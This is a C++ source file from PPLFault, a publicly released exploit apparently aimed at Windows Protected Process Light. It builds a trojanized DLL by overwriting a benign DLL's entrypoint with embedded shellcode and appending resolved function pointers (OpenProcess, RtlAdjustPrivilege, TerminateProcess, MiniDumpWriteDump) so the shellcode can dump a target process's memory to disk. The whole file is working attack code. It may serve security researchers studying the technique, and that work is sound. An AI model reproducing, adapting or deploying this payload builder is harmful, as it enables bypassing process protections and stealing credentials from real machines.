// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "Payload.h"
#include "DumpShellcode.h"
#include "resource.h"
#include "Logging.h"
#include "PayloadUtils.h"
#include <stdio.h>
#include <DbgHelp.h>
#include <string>

// Builds a SHELLCODE_PARAMS struct so our payload can be smaller and simpler
bool InitShellcodeParams(
    PSHELLCODE_PARAMS pParams,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath
)
{
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

    if ((NULL == hKernel32) || (NULL == hNtdll))
    {
        Log(Error, "Couldn't find kernel32/ntdll?  What?");
        return false;
    }

    pParams->magic1 = MAGIC1;
    pParams->magic2 = MAGIC2;

    // User params
    pParams->dwTargetProcessId = dwTargetProcessId;
    if (wcslen(pDumpPath) >= _countof(pParams->dumpPath))
    {
        Log(Error, "Dump path too long: %ws", pDumpPath);
        return false;
    }
    wcsncpy(pParams->dumpPath, pDumpPath, _countof(pParams->dumpPath));

    // Strings (so we don't have to embed them in shellcode)
    strncpy(pParams->szMiniDumpWriteDump, "MiniDumpWriteDump", _countof(pParams->szMiniDumpWriteDump));
    wcsncpy(pParams->szDbgHelpDll, L"Dbghelp.dll", _countof(pParams->szDbgHelpDll));

    // IAT
    // Target process should already have kernel32 loaded, so we can just pass pointers over
    pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, "LoadLibraryW");
    pParams->pGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, "GetProcAddress");
    pParams->pOpenProcess = (OpenProcess_t)GetProcAddress(hKernel32, "OpenProcess");
    pParams->pCreateFileW = (CreateFileW_t)GetProcAddress(hKernel32, "CreateFileW");
    pParams->pTerminateProcess = (TerminateProcess_t)GetProcAddress(hKernel32, "TerminateProcess");
    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");    

    if (!pParams->pLoadLibraryW || 
        !pParams->pGetProcAddress || 
        !pParams->pOpenProcess || 
        !pParams->pCreateFileW || 
        !pParams->pTerminateProcess ||
        !pParams->pRtlAdjustPrivilege)
    {
        Log(Error, "Failed to resolve a payload import");
        return false;
    }

    return true;
}

// Build a payload that consists of the given benign DLL with its entrypoint overwritten by our shellcode
bool BuildPayload(
    HANDLE hBenignDll, 
    std::string & payloadBuffer,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath)
{
    std::string buf;
    LARGE_INTEGER dllSize;
    DWORD dwBytesRead = 0;
    PVOID pEntrypoint = NULL;
    DWORD bytesWritten = 0;
    SHELLCODE_PARAMS params = { 0, };
    SIZE_T availableSpace = 0;

    // Read entire source file into buffer
    SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
    GetFileSizeEx(hBenignDll, &dllSize);
    buf.resize(dllSize.QuadPart);

    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
        (dwBytesRead != dllSize.QuadPart))
    {
        Log(Error, "BuildPayload: ReadFile failed with GLE %u", GetLastError());
        return false;
    }

    // Find the entrypoint
    pEntrypoint = FindEntrypointVA(buf);
    if (!pEntrypoint)
    {
        return false;
    }

    availableSpace = &buf[buf.size()] - (char*)pEntrypoint;

    // Overwrite entrypoint with shellcode embedded in our resource section
    if (!WriteShellcode(MAKEINTRESOURCE(RES_PAYLOAD), pEntrypoint, availableSpace, bytesWritten))
    {
        return false;
    }

    // Create a SHELLCODE_PARAMS and write it after the shellcode
    if (!InitShellcodeParams(&params, dwTargetProcessId, pDumpPath))
    {
        return false;
    }

    if (&buf[buf.size() - 1] - (char*)pEntrypoint + bytesWritten < sizeof(params))
    {
        Log(Error, "Not enough space for SHELLCODE_PARAMS");
        return false;
    }

    // Install SHELLCODE_PARAMS
    memcpy(((PUCHAR)pEntrypoint) + bytesWritten, &params, sizeof(params));

    payloadBuffer = std::move(buf);

    return true;
}
